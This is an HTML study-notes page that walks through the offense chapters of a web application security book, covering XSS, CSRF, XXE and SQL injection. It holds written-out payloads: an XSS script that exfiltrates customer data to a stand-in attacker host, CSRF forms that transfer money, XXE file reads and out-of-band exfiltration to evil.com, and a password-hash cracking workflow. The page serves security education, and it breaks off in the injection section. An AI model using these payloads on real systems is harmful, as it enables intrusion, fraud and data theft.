@@ -1,0 +1,1196 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="auto">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Part II: Offense — Web Application Security (Hoffman) explained simply</title>
+<meta name="description" content="A plain-language walkthrough of Part II (Offense, chapters 9–19) of Web Application Security: Exploitation and Countermeasures by Andrew Hoffman, with the book's figures and code examples embedded.">
+<style>@@CSS@@</style>
+</head>
+<body>
+<div id="progress"></div>
+
+<header class="hero">
+  <div class="wrap">
+    <div class="eyebrow">Book notes · deep dive 2 of 2 · Part II</div>
+    <h1>Part II: Offense</h1>
+    <p class="subtitle">Chapters 9–19 of <em>Web Application Security: Exploitation and Countermeasures</em> (Andrew Hoffman, 2nd ed. 2024). Part I built the map; Part II breaks into it. Eleven chapters, ten attack families — XSS, CSRF, XXE, injection, denial of service, object attacks, client-side attacks, dependency attacks and business-logic abuse — each explained simply, with the book’s own figures, code and payloads.</p>
+    <div class="meta">
+      <span class="chip">Chapters 9–19</span>
+      <span class="chip">Book pages 113–228</span>
+      <span class="chip">19 figures</span>
+      <span class="chip">Runs on the Part I map</span>
+    </div>
+    <nav class="booknav">
+      <a href="web-application-security-part1-recon.html">← Part I: Recon</a>
+      <a href="web-application-security.html">All 37 chapters (summary)</a>
+      <a href="index.html">All notes</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap layout">
+<aside class="toc">
+  <h4>Contents</h4>
+  <a href="#tldr">Part II in one page</a>
+  <a href="#ch9">9 · Hacker’s mindset</a>
+  <a href="#ch10">10 · Cross-site scripting</a>
+  <a href="#ch11">11 · CSRF</a>
+  <a href="#ch12">12 · XXE</a>
+  <a href="#ch13">13 · Injection</a>
+  <a href="#ch14">14 · Denial of service</a>
+  <a href="#ch15">15 · Data &amp; objects</a>
+  <a href="#ch16">16 · Client-side attacks</a>
+  <a href="#ch17">17 · Third-party dependencies</a>
+  <a href="#ch18">18 · Business logic</a>
+  <a href="#ch19">19 · Part II summary</a>
+  <a href="#cheatsheet">Attack cheat sheet</a>
+  <a href="#defender">Defender’s map</a>
+</aside>
+
+<main>
+
+<!-- ================= TL;DR ================= -->
+<section id="tldr">
+  <h2>Part II in one page</h2>
+  <p class="oneliner">Every attack in Part II is one story told ten ways: <b>the application treated something as trusted that the attacker controls.</b> Data became code (XSS, injection), a request became intent (CSRF), a file became a command (XXE), an object key became a permission (mass assignment), a rule became a money printer (business logic).</p>
+
+  <div class="tablewrap">
+    <table>
+      <thead><tr><th>Chapter</th><th>Attack</th><th>The one-sentence version</th></tr></thead>
+      <tbody>
+        <tr><td>10</td><td>XSS</td><td>The browser runs the attacker’s script as if it were your application’s.</td></tr>
+        <tr><td>11</td><td>CSRF</td><td>The victim’s browser sends a request the victim never intended.</td></tr>
+        <tr><td>12</td><td>XXE</td><td>A malicious XML document makes the parser read server files — or call out to the attacker.</td></tr>
+        <tr><td>13</td><td>Injection</td><td>Input reaches an interpreter (SQL, a CLI, the OS) and is read as instructions.</td></tr>
+        <tr><td>14</td><td>DoS</td><td>The attacker spends one request to burn a lot of your resources.</td></tr>
+        <tr><td>15</td><td>Mass assignment / IDOR / serialization</td><td>Objects are written with fields the developer never expected, or read with ids they never authorised.</td></tr>
+        <tr><td>16</td><td>Prototype pollution / clickjacking / tabnabbing</td><td>The attack lives entirely in the browser and never touches your server.</td></tr>
+        <tr><td>17</td><td>Dependency attacks</td><td>The weakest code in your stack is the code you did not write.</td></tr>
+        <tr><td>18</td><td>Business logic</td><td>The code does exactly what it says — and that is the vulnerability.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout warn">
+    <span class="label">Scope</span>
+    <p>Everything in Part II is described for <strong>authorised testing, red-teaming and defence</strong> — the book says this repeatedly. Only test systems you own or have explicit written permission to test.</p>
+  </div>
+
+  <div class="defender">
+    <span class="label">Why a defender should read Part II at all</span>
+    <p>Each chapter ends with an implicit question about your own application: does any endpoint take a string and put it in the DOM? Does any state change work over a GET? Does any parser accept XML? Does any query get built by concatenation? Part III answers those questions with fixes; Part II is where you learn which fixes actually matter — and the book warns in its own summary that defences are “mitigations”, not bulletproof fixes.</p>
+  </div>
+</section>
+
+<hr>
+
+<!-- ================= CH 9 ================= -->
+<section id="ch9">
+  <h2><span class="num">Chapter 9</span> · Introduction to Hacking Web Applications</h2>
+  <p class="oneliner">Hacking is mostly reading and pattern-spotting, not magic: engineers measure a day by features shipped, hackers measure it by clues found.</p>
+
+  <h3>The hacker’s mindset</h3>
+  <ul>
+    <li><strong>Productivity looks different.</strong> A developer says “I shipped features x and y”. A hacker’s day is mostly data gathering and analysis, full of false positives — it looks like wasted time to an outsider.</li>
+    <li><strong>Hackers rarely modify software.</strong> They analyse the existing codebase and look for <em>entry points</em> that are already there.</li>
+    <li><strong>Every codebase contains exploitable bugs.</strong> A good hacker stays alert for clues rather than for a specific bug.</li>
+    <li><strong>Long dry spells are normal.</strong> Weeks or months of analysis before a usable entry point appears — so keep a record of what you tried and what you learned.</li>
+    <li><strong>Keep learning.</strong> Techniques go stale as the web adapts.</li>
+    <li><strong>The ladder:</strong> a hacker is a detective; a good hacker is an organised detective; a great hacker adds technical skill; a master hacker keeps adapting.</li>
+  </ul>
+
+  <h3>Applied recon — why Part I is not over</h3>
+  <ul>
+    <li><strong>API type</strong> — most payloads in Part II are delivered over REST APIs, so knowing that an app is REST-first tells you how to shape a request.</li>
+    <li><strong>Endpoints</strong> — one endpoint that ignores your permission may not be interesting; <code>/users/1234/settings</code> probably is.</li>
+    <li><strong>Code reuse across a company</strong> — an exploit found on one subdomain often works on another, because teams copy each other.</li>
+    <li><strong>Authentication scheme</strong> — authenticated users get a superset of functionality, and those requests run with more privilege, so most interesting attacks happen <em>inside</em> a session.</li>
+    <li><strong>Dependencies</strong> — public exploits against third-party libraries are often copy-and-paste jobs.</li>
+    <li><strong>Architecture</strong> — if application B is untouchable but application A talks to it, attack A to reach B.</li>
+  </ul>
+  <div class="callout info">
+    <span class="label">The book’s framing</span>
+    <p>Recon and offence are each interesting on their own, and far more valuable together. Part II exists because a payload with no target is useless, and a target with no payload is just a map.</p>
+  </div>
+</section>
+
+<hr>
+
+<!-- ================= CH 10 ================= -->
+<section id="ch10">
+  <h2><span class="num">Chapter 10</span> · Cross-Site Scripting (XSS)</h2>
+  <p class="oneliner">XSS is what happens when your application’s data becomes your application’s code: the browser executes the attacker’s script with all the powers your own JavaScript has, inside a real user’s session.</p>
+
+  <p>The book opens with a story that makes the whole class obvious. An unhappy customer types feedback into MegaBank’s support portal. The form has no bold button, so they try HTML:</p>
+  <div class="code">
+    <div class="bar"><span class="title">The innocent version — a customer just wants bold text</span><span class="tag neutral">book example</span></div>
+<pre><code>I am not happy with the service provided by your bank.
+I have waited 12 hours for my deposit to show up in the web application.
+&lt;strong&gt;Please improve your web application.&lt;/strong&gt;
+Other banks will show deposits instantly.</code></pre>
+  </div>
+  <p>It works — the text is bold. The support rep even asks how. That single success proves the application renders user input as <strong>DOM</strong> instead of <strong>text</strong>, and the same door takes a script:</p>
+
+  <ul class="steps">
+    <li><b>Submit</b> User sends a comment through a web form.</li>
+    <li><b>Store</b> The comment is saved in the database as text.</li>
+    <li><b>Retrieve</b> One or many users request the comment over HTTP.</li>
+    <li><b>Inject</b> The comment is placed into the page — as markup.</li>
+    <li><b>Execute</b> The browser interprets the injected markup as DOM and runs the script.</li>
+  </ul>
+
+  <p>And this is the developer habit that causes it — one line, <code>innerHTML</code>:</p>
+  <div class="code">
+    <div class="bar"><span class="title">The exact mistake: appending a string as DOM instead of as text</span><span class="tag bad">vulnerable</span></div>
+<pre><code>const comment = 'my &lt;strong&gt;comment&lt;/strong&gt;';
+const div = document.createElement('div');
+div.innerHTML = comment;          // interpreted as DOM, not text
+
+const wrapper = document.querySelector('#commentArea');
+wrapper.appendChild(div);</code></pre>
+  </div>
+
+  <p>Then the book turns the same bug into an actual weapon. Posted as a support comment, this script runs in the <em>support rep’s</em> browser, reads the privileged customer data on that screen and posts it to the attacker’s server:</p>
+  <div class="code">
+    <div class="bar"><span class="title">Stored XSS payload — exfiltrating the support rep’s data</span><span class="tag bad">malicious payload</span></div>
+<pre><code>&lt;script&gt;
+  // get a list of all customers from the page
+  const customers = document.querySelectorAll('.openCases');
+  const customerData = [];
+
+  customers.forEach((customer) =&gt; {
+    customerData.push({
+      firstName: customer.querySelector('.firstName').innerText,
+      lastName:  customer.querySelector('.lastName').innerText,
+      email:     customer.querySelector('.email').innerText,
+      phone:     customer.querySelector('.phone').innerText
+    });
+  });
+
+  // exfiltrate the collected data to the attacker's server
+  const http = new XMLHttpRequest();
+  http.open('POST', 'https://steal-your-data.com/data', true);
+  http.setRequestHeader('Content-type', 'application/json');
+  http.send(JSON.stringify(customerData));
+&lt;/script&gt;</code></pre>
+  </div>
+
+  <div class="callout warn">
+    <span class="label">Why this is so nasty</span>
+    <p>The script tags are invisible in the rendered comment — the rep sees only the polite complaint. No click required: a script tag that reaches the DOM is executed immediately. And because the payload is <em>stored</em>, every rep who opens the comment is attacked.</p>
+  </div>
+
+  <h3>What an XSS attack can do</h3>
+  <ul>
+    <li>Run a script in the browser that the application owner never wrote.</li>
+    <li>Run silently, with no visibility and no user interaction to start it.</li>
+    <li>Read any data present in the current page — often more than the victim realises.</li>
+    <li>Send data out, and pull further code in, from the attacker’s server.</li>
+    <li>Steal session tokens → account takeover.</li>
+    <li>Draw DOM elements over the real UI → near-perfect phishing that a non-technical user cannot detect.</li>
+  </ul>
+
+  <h3>Stored, reflected, DOM-based — and mutation-based</h3>
+  <p>The book introduces the big three (stored, reflected, DOM-based) and later adds a fourth (mutation-based). The mental model:</p>
+
+  <div class="figrow">
+    <figure>
+      <img src="@@FIG:hoff_10-1.jpg@@" alt="Flow diagram of stored XSS: a user submits a form, data is stored in a database, another user requests it, it is injected into the DOM and executed">
+      <figcaption><b>Figure 10-1 — stored XSS.</b> User #1 submits → the API stores it in the database → User #2 asks for it → the API returns it → it is injected into User #2’s DOM → the script runs on User #2’s device. The attacker never talks to the victim: the database does the delivery.</figcaption>
+    </figure>
+    <figure>
+      <img src="@@FIG:hoff_10-2.jpg@@" alt="Flow diagram of reflected XSS: a malicious link containing script in the URL is shared, clicked, and reflected into the DOM">
+      <figcaption><b>Figure 10-2 — reflected XSS.</b> User #1 builds a link with the script in the URL, shares it, User #2 clicks it, and the server reflects that URL straight back into the page — executing on User #2’s device. Nothing is stored, so the attack targets one victim at a time.</figcaption>
+    </figure>
+  </div>
+
+  <ul>
+    <li><strong>Stored</strong> — easiest to detect (it sits in your database) and often the most dangerous (one payload, many victims). A featured video title with a stored XSS could hit every visitor for as long as it is featured. Because the payload is stored server-side as text, scanning database entries for script is a cheap mitigation — but not a fix: payloads can be encoded (base64, binary) or split across fields and only become dangerous when a service concatenates them.</li>
+    <li><strong>Reflected</strong> — the server echoes the payload back without storing it. Harder to find, easier to disguise: the book shows a page of three “helpful” links where the third carries the payload in a query string.</li>
+    <li><strong>DOM-based</strong> — no server involvement at all: a <em>source</em> (something that holds text, e.g. <code>window.location.hash</code>) flows into a <em>sink</em> (something that executes text, e.g. <code>document.write</code> or <code>innerHTML</code>).</li>
+    <li><strong>Mutation-based (mXSS)</strong> — the payload passes the filter, then the browser’s parser “corrects” it into something executable.</li>
+  </ul>
+
+  <div class="code">
+    <div class="bar"><span class="title">Reflected: the payload rides in the query string</span><span class="tag bad">payload</span></div>
+<pre><code>https://support.mega-bank.com/search?query=open+&lt;script&gt;alert(test);&lt;/script&gt;checking+account</code></pre>
+  </div>
+
+  <div class="code">
+    <div class="bar"><span class="title">DOM XSS: hash (source) → document.write (sink), no server involved</span><span class="tag bad">vulnerable</span></div>
+<pre><code>const hash = document.location.hash;
+const funds = [];
+const nMatches = findNumberOfMatches(funds, hash);
+
+// the hash is written into the DOM as markup
+document.write(nMatches + ' matches found for ' + hash);
+
+// attacker link:
+// investors.mega-bank.com/listing#&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></pre>
+  </div>
+
+  <div class="callout info">
+    <span class="label">Why DOM XSS is the hardest to catch</span>
+    <p>The traffic never leaves the browser, so server-side scanners see nothing. It also depends on the browser and version: a bug in one DOM implementation may not exist in another, so a company supporting many browsers can struggle even to reproduce the report.</p>
+  </div>
+
+  <h3>Mutation-based XSS (mXSS)</h3>
+  <p>Named by Mario Heiderich’s paper on <code>innerHTML</code> mutations. The idea: a payload that is <em>safe</em> when the filter inspects it, and <em>unsafe</em> after the browser has optimised and re-parsed the DOM. The book’s example is Masato Kinugawa’s 2019 bypass of DOMPurify inside Google’s Closure library:</p>
+  <div class="code">
+    <div class="bar"><span class="title">The payload that looked safe… and what the browser made of it</span><span class="tag bad">mXSS</span></div>
+<pre><code>&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;
+
+// after the browser re-parses it:
+&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;
+&lt;img src="x" onerror="alert(1)"&gt;"&gt;</code></pre>
+  </div>
+  <p>Why it worked: DOMPurify sanitises inside a <code>&lt;template&gt;</code> element, where scripting is <em>disabled</em>. In that context <code>&lt;noscript&gt;</code> exposes its children as elements, so the <code>img onerror</code> could not fire. Once the string left the sanitizer and entered a real browser (scripting <em>enabled</em>), <code>&lt;noscript&gt;</code> stopped doing anything, the broken <code>&lt;p title="</code> was discarded, and the image handler became live. Filters that were considered robust — DOMPurify, OWASP AntiSamy, Google Caja — have all been bypassed this way.</p>
+
+  <figure>
+    <img src="@@FIG:hoff_10-3.jpg@@" alt="Diagram of DOM-based XSS where browser-side code moves data from a source into a dangerous sink">
+    <figcaption><b>Figure 10-3 — DOM-based XSS.</b> A filter page stores its state in <code>window.location.hash</code>; the script rebuilds the page with <code>DOMParser.parseFromString()</code> and appends the result to <code>&lt;body&gt;</code>. Change the hash to include a script and the new script node executes as it loads. The server is innocent throughout — which is why DOM XSS is sometimes reclassified as “client-side XSS”.</figcaption>
+  </figure>
+
+  <h3>Bypassing filters</h3>
+  <p>Only a small fraction of sites use best-in-class sanitisation, so most filters are homemade blocklists — and the DOM/JS specs are big enough to walk around them.</p>
+  <div class="tablewrap">
+    <table>
+      <thead><tr><th>Trick</th><th>Why it works</th><th>Example</th></tr></thead>
+      <tbody>
+        <tr><td>Self-closing / unclosed tags</td><td>The browser repairs broken markup, so a filter that looks for tag <em>pairs</em> misses it</td><td><code>&lt;script&gt;alert()</code> becomes <code>&lt;script&gt;alert()&lt;/script&gt;</code></td></tr>
+        <tr><td>Protocol-relative URLs</td><td><code>//host</code> lets the browser choose the scheme, so filters looking for <code>http(s)://</code> miss it</td><td><code>&lt;a href="//evil-website.com"&gt;</code></td></tr>
+        <tr><td>Malformed tags</td><td>Chrome restores quotes and attributes before rendering</td><td><code>&lt;IMG """"&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"\&gt;</code></td></tr>
+        <tr><td>Encoding escapes</td><td>Unicode is a valid alternative spelling of any Latin character</td><td><code>\u0061lert(1)</code> = <code>alert(1)</code></td></tr>
+        <tr><td>Polyglot payloads</td><td>One payload that executes in many contexts saves per-context guessing</td><td>the 2018 <code>jaVasCript:</code> polyglot by 0xSobky</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="code">
+    <div class="bar"><span class="title">Unicode spelling — same script, no matching keyword</span><span class="tag neutral">book code</span></div>
+<pre><code>alert(1);                          // blocked: the filter knows this string
+\u0061lert(1);                     // alert(1), substituting the "a"
+a\u006cert(1);                     // alert(1), substituting the "l"
+\u0061\u006c\u0065\u0072\u0074(1); // alert(1), all characters</code></pre>
+  </div>
+
+  <figure>
+    <img src="@@FIG:hoff_10-4.jpg@@" alt="The DOMPurify project page, an industry-standard XSS sanitizer">
+    <figcaption><b>Figure 10-4 — DOMPurify.</b> Cure53’s sanitizer repository: 11.8k stars, 1,868 commits, 96 releases, 186M downloads a month and 236k+ dependents — which is also why it is such a high-value target for bypass research. The right way to allow user HTML, provided you keep it patched and pair it with CSP.</figcaption>
+  </figure>
+</section>
+
+<hr>
+
+<!-- ================= CH 11 ================= -->
+<section id="ch11">
+  <h2><span class="num">Chapter 11</span> · Cross-Site Request Forgery (CSRF)</h2>
+  <p class="oneliner">CSRF doesn’t steal the session — it borrows it. The victim’s own browser, already logged in, is tricked into sending a request the victim never intended.</p>
+
+  <p>The two identifying marks of a CSRF attack, per the book: <strong>privilege escalation</strong> (an action the attacker could not perform alone) and <strong>stealth</strong> (the account that performs it never knows). It works because browsers automatically attach a site’s cookies to any request that site receives — no matter who wrote the page that triggered the request.</p>
+
+  <figure>
+    <img src="@@FIG:hoff_11-1.jpg@@" alt="Flow diagram of a CSRF GET attack: a malicious link is distributed, clicked, and a GET request is made on the victim's behalf with their auth cookie">
+    <figcaption><b>Figure 11-1 — CSRF over GET.</b> User #1 creates a malicious link to a GET endpoint and distributes it by email or on a site. User #2 clicks it; the browser sends the request with User #2’s auth cookie; the server changes state “as User #2” — who has no idea it happened.</figcaption>
+  </figure>
+
+  <h3>Anatomy of the request</h3>
+  <div class="code">
+    <div class="bar"><span class="title">A GET is just a line of text — which is what makes it so forgeable</span><span class="tag neutral">book code</span></div>
+<pre><code>GET /resource-url?key=value HTTP/1.1
+Host: www.mega-bank.com</code></pre>
+  </div>
+  <p>The book then builds the vulnerable server in ExpressJS, first harmlessly:</p>
+  <div class="code">
+    <div class="bar"><span class="title">A harmless reflective route (and what it teaches)</span><span class="tag neutral">book code</span></div>
+<pre><code>app.get('/account', function(req, res) {
+  if (!req.query) { return res.sendStatus(400); }
+  return res.json(req.query);
+});</code></pre>
+  </div>
+  <p>…and from the browser, with and without params:</p>
+  <div class="code">
+    <div class="bar"><span class="title">Same request, with params attached</span><span class="tag neutral">book code</span></div>
+<pre><code>const xhr = new XMLHttpRequest();
+const params = 'id=12345';
+xhr.onreadystatechange = function() {
+  console.log(xhr.responseText);
+};
+xhr.open('GET', `https://www.mega-bank.com/account?${params}`, true);
+xhr.send();
+
+// response: { id: 12345 }  with HTTP 200</code></pre>
+  </div>
+  <p>Now the same pattern, but the query parameters change state — a money transfer:</p>
+  <div class="code">
+    <div class="bar"><span class="title">The dangerous version: a GET that moves money</span><span class="tag bad">vulnerable</span></div>
+<pre><code>app.get('/transfer', function(req, res) {
+  if (!session.isAuthenticated) { return res.sendStatus(401); }
+  if (!req.query.to_user) { return res.sendStatus(400); }
+  if (!req.query.amount)  { return res.sendStatus(400); }
+
+  transferFunds(session.currentUser, req.query.to_user, req.query.amount,
+    (error) =&gt; {
+      if (error) { return res.sendStatus(400); }
+      return res.json({
+        operation: 'transfer',
+        amount: req.query.amount,
+        from: session.currentUser,
+        to: req.query.to_user,
+        status: 'complete'
+      });
+    });
+});</code></pre>
+  </div>
+  <p>The route checks privileges and checks that a recipient exists — so it <em>looks</em> secure. But it never verifies that the person clicking meant to do it, and a GET can be triggered by anything:</p>
+  <div class="code">
+    <div class="bar"><span class="title">The one-line attack link</span><span class="tag bad">payload</span></div>
+<pre><code>&lt;a href="https://www.mega-bank.com/transfer?to_user=attacker&amp;amount=10000"&gt;click me&lt;/a&gt;</code></pre>
+  </div>
+
+  <h3>Alternate GET payloads</h3>
+  <p>Any tag with an <code>src</code> makes the request as soon as it loads — no click needed. An invisible pixel is enough:</p>
+  <div class="code">
+    <div class="bar"><span class="title">An 0×0 image that transfers money</span><span class="tag bad">payload</span></div>
+<pre><code>&lt;img src="https://www.mega-bank.com/transfer?to_user=attacker&amp;amount=10000"
+     width="0" height="0" border="0"&gt;
+
+&lt;video width="1280" height="720" controls&gt;
+  &lt;source src="https://www.mega-bank.com/transfer?to_user=attacker&amp;amount=10000"
+          type="video/mp4"&gt;
+&lt;/video&gt;</code></pre>
+  </div>
+
+  <figure>
+    <img src="@@FIG:hoff_11-2.jpg@@" alt="Diagram of CSRF via an img tag posted inside the target application, forcing a GET">
+    <figcaption><b>Figure 11-2 — CSRF via <code>&lt;img&gt;</code>.</b> Because the browser fetches image sources automatically, merely loading a page that contains this tag fires the state-changing GET. The victim sees nothing at all.</figcaption>
+  </figure>
+
+  <h3>CSRF against POST endpoints</h3>
+  <p>POST requires a little more work and, usually, one user interaction — because a plain HTML form can POST without any JavaScript:</p>
+  <div class="code">
+    <div class="bar"><span class="title">Hidden fields do the damage; visible fields do the acting</span><span class="tag bad">payload</span></div>
+<pre><code>&lt;form action="https://www.mega-bank.com/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="to_user" value="attacker"&gt;
+  &lt;input type="hidden" name="amount"  value="10000"&gt;
+  &lt;input type="text"     name="username" value="username"&gt;
+  &lt;input type="password" name="password" value="password"&gt;
+  &lt;input type="submit"   value="Submit"&gt;
+&lt;/form&gt;</code></pre>
+  </div>
+  <p>The victim sees a plausible login form; submitting it never logs in anywhere — it fires the transfer, using the session the victim already has at MegaBank. The book also notes a variant that reaches <strong>internal networks</strong>: the attacker cannot reach the intranet, but the victim’s browser can, so a form submitted <em>by</em> an insider makes the request for them.</p>
+
+  <figure>
+    <img src="@@FIG:hoff_11-3.jpg@@" alt="Diagram of CSRF against a POST endpoint using a form submitted to another server">
+    <figcaption><b>Figure 11-3 — CSRF against POST.</b> The form targets a server the attacker cannot reach but the victim can. The browser supplies the cookies and the network position; the attacker supplies the payload.</figcaption>
+  </figure>
+
+  <h3>Bypassing CSRF defences</h3>
+  <ul>
+    <li><strong>Header validation</strong> — defences that check <code>Referer</code> or <code>Origin</code> can be defeated by removing the header: <code>rel="noreferrer"</code> on a link or a form makes the browser omit the referrer, and the server then compares against <code>null</code>/<code>undefined</code>. The book’s blunt opinion: headers are easily forged or stripped and should not be a first-line security measure.</li>
+    <li><strong>Token pools</strong> — if tokens are validated from a shared pool rather than tied to a session, you can mint a valid token from your own account and reuse it. Tokens are also readable from DevTools on a test account.</li>
+    <li><strong>Weak tokens</strong> — predictable tokens (dates, times, usernames, counters) are forgeable. The book’s example: <code>1691434927</code> and <code>1691434928</code> are just Unix timestamps.</li>
+  </ul>
+  <div class="code">
+    <div class="bar"><span class="title">Replaying a “valid” token of your own</span><span class="tag neutral">book code</span></div>
+<pre><code>curl https://website.com/auth -H "anti-csrf-token": "12345abc"</code></pre>
+  </div>
+</section>
+
+<hr>
+
+<!-- ================= CH 12 ================= -->
+<section id="ch12">
+  <h2><span class="num">Chapter 12</span> · XML External Entity (XXE)</h2>
+  <p class="oneliner">XML lets a document define its own entities. If the parser resolves <em>external</em> ones, the document can read files off your server — or send them to the attacker.</p>
+
+  <p>XML documents can reference entities declared in a document type definition (DTD). Some are built in; the dangerous ones are custom, and the most dangerous of all point outside the document:</p>
+  <div class="code">
+    <div class="bar"><span class="title">One line of XML that reads a Linux password file</span><span class="tag bad">payload</span></div>
+<pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM "file:///etc/passwd"&gt; ]&gt;</code></pre>
+  </div>
+
+  <h3>Direct XXE — the app parses your XML and answers with it</h3>
+  <p>The book’s example is a “send screenshot to support” feature: the browser serialises the current page DOM to XML, posts it to a utility service that converts XML → JPG, and forwards the image to support.</p>
+  <div class="code">
+    <div class="bar"><span class="title">Client: serialise the DOM and post it as XML</span><span class="tag neutral">book code</span></div>
+<pre><code>const screenshot = function() {
+  try {
+    const div = document.getElementById('content').innerHTML;
+    const serializer = new XMLSerializer();
+    const dom = serializer.serializeToString(div);
+
+    const xhr = new XMLHttpRequest();
+    const url = 'https://util.mega-bank.com/screenshot';
+    const data = new FormData();
+    data.append('dom', dom);
+
+    xhr.onreadystatechange = function() {
+      sendScreenshotToSupport(xhr.responseText, (err) =&gt; {
+        if (err) { alert('could not send screenshot.'); }
+        else     { alert('screenshot sent to support!'); }
+      });
+    };
+    xhr.send(data);
+  } catch (e) {
+    alert('Your browser does not support this functionality. Consider upgrading.');
+  }
+};</code></pre>
+  </div>
+  <div class="code">
+    <div class="bar"><span class="title">Server: receives the XML and hands it to a parser</span><span class="tag neutral">book code</span></div>
+<pre><code>import xmltojpg from './xmltojpg';
+
+app.post('/screenshot', function(req, res) {
+  if (!req.body.dom) { return res.sendStatus(400); }
+  xmltojpg.convert(req.body.dom)
+    .then((err, jpg) =&gt; {
+      if (err) { return res.sendStatus(400); }
+      return res.send(jpg);
+    });
+});</code></pre>
+  </div>
+  <p>Under normal use this is harmless. But the “DOM” being sent is just a string, and a client can send any string it likes — no browser required:</p>
+  <div class="code">
+    <div class="bar"><span class="title">Forging the request with your own XML</span><span class="tag bad">payload</span></div>
+<pre><code>const xhr = new XMLHttpRequest();
+xhr.open('POST', utilAPI.url + '/screenshot');
+xhr.setRequestHeader('Content-Type', 'application/xml');
+
+const rawXMLString = `&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;xxe&gt;&amp;xxe;&lt;/xxe&gt;`;
+
+xhr.onreadystatechange = function() {
+  if (this.readyState === XMLHttpRequest.DONE &amp;&amp; this.status === 200) {
+    // check response data here
+  }
+};
+xhr.send(rawXMLString);</code></pre>
+  </div>
+  <p>If the parser has external entities enabled, the “screenshot” comes back containing the text of <code>/etc/passwd</code>.</p>
+
+  <figure>
+    <img src="@@FIG:hoff_12-1.jpg@@" alt="Flow diagram of direct XXE: an XML payload is parsed and a local file is reflected back in the response">
+    <figcaption><b>Figure 12-1 — direct XXE.</b> One request carries the payload and the DTD together; the parser resolves the external entity, the file lands in the parsing result, and the response hands it back.</figcaption>
+  </figure>
+
+  <h3>Indirect XXE — you never send XML at all</h3>
+  <p>An API can accept plain JSON and still use an XML parser internally: the server converts your payload to XML because the enterprise system it talks to (CRM, accounting, HR) only speaks XML. That conversion is invisible from outside — and still vulnerable. Discovering it takes inference: research the company’s known enterprise vendors, look for third-party URLs, or notice data formats that only make sense if an old system is behind the API.</p>
+
+  <figure>
+    <img src="@@FIG:hoff_12-2.jpg@@" alt="Flow diagram of indirect XXE: the server builds an XML file from user parameters and then parses it">
+    <figcaption><b>Figure 12-2 — indirect XXE.</b> User parameters are dropped into an XML document the server generates, and that generated document is parsed. The payload hides inside a field that never looked like XML.</figcaption>
+  </figure>
+
+  <h3>Out-of-band exfiltration</h3>
+  <p>Sometimes the response contains nothing useful even though the parser is vulnerable. Then you make the <em>server</em> send the data to you. Host a DTD on your own server, reference it from the payload, and have it stream a file out over FTP (or HTTP/LDAP in some environments):</p>
+  <div class="code">
+    <div class="bar"><span class="title">Payload → your DTD → your FTP logs</span><span class="tag bad">payload</span></div>
+<pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE a [
+  &lt;!ENTITY % dtd SYSTEM "https://evil.com/data.dtd"&gt;
+  %asd;
+  %c;
+]&gt;
+&lt;a&gt;&amp;rrr;&lt;/a&gt;
+
+&lt;!-- data.dtd, hosted on the attacker's server --&gt;
+&lt;!ENTITY % d SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % c "&lt;!ENTITY rrr SYSTEM 'ftp://evil.com/%d;'&gt;"&gt;</code></pre>
+  </div>
+
+  <h3>The account-takeover workflow</h3>
+  <p>The book’s most powerful XXE pattern: a chain of small file reads that ends in a shell.</p>
+  <ul class="steps">
+    <li><b>Read <code>/etc/passwd</code></b> — one line per user, seven colon-separated fields: username, password location (<code>x</code> = hash lives in <code>/etc/shadow</code>), UID, GID, comment, home directory, shell. This alone leaks accounts, homes and groups.</li>
+    <li><b>Read <code>/etc/shadow</code></b> — line two of each entry holds the hash as <code>$id:$salt:$hash</code>. The <code>$id</code> tells you the algorithm: <code>$1$</code> MD5, <code>$2a$</code>/<code>$2y$</code> Blowfish, <code>$5$</code> SHA-256, <code>$6$</code> SHA-512, <code>$y$</code> yescrypt.</li>
+    <li><b>Crack the hash</b> — format the two files with <code>unshadow</code>, then run John the Ripper or Hashcat. This is CPU/GPU-heavy: John uses one or the other, Hashcat can use both.</li>
+    <li><b>Log in</b> — with username and password, <code>ssh user@host</code>. The attacker now controls a real account on the server.</li>
+  </ul>
+  <div class="code">
+    <div class="bar"><span class="title">The cracking workflow in five lines</span><span class="tag neutral">book code</span></div>
+<pre><code># 1. save the stolen files locally
+passwd.txt   shadow.txt
+
+# 2. merge them into a format the cracker understands
+unshadow passwd.txt shadow.txt &gt; passwords.txt
+
+# 3. crack, then show the plaintext
+john passwords.txt
+john --show passwords.txt</code></pre>
+  </div>
+  <div class="callout info">
+    <span class="label">The lesson for defenders</span>
+    <p>XXE is often a <em>one-line</em> misconfiguration and needs no exploit chain at all — which is exactly why it is worth trying on every application that touches XML, and why disabling DTDs and external entities is such a cheap fix.</p>
+  </div>
+</section>
+
+<hr>
+
+<!-- ================= CH 13 ================= -->
+<section id="ch13">
+  <h2><span class="num">Chapter 13</span> · Injection</h2>
+  <p class="oneliner">Injection always has two parts: an interpreter and a payload fed into it. SQL is the famous case, but a CLI or the operating system works just as well.</p>
+
+  <h3>SQL injection</h3>
+  <p>The book starts with PHP — because PHP’s relaxed mixing of SQL, HTML and logic produced a generation of vulnerable code. An old-school login:</p>
+  <div class="code">
+    <div class="bar"><span class="title">Old-school PHP login: SQL built by concatenation</span><span class="tag bad">vulnerable</span></div>
+<pre><code>&lt;?php
+  // ... form HTML, then on POST:
+  $database = new mysqli($servername, $username, $password, $database, $dbport);
+
+  $sql = "SELECT userId, username, admin, moderator FROM users WHERE username = '"
+       . $_POST['username'] . "' AND password = '" . sha1($_POST['password']) . "';";
+
+  $result = mysqli_query($database, $sql);
+?&gt;</code></pre>
+  </div>
+  <p>This is also why injection numbers fell: as PHP tightened its standards and lost popularity, SQL injection dropped from nearly 5% of all vulnerabilities in 2010 to under 1% today (NVD). The lesson survived into other languages — but the same mistake is easy to make in a modern Node service:</p>
+  <div class="code">
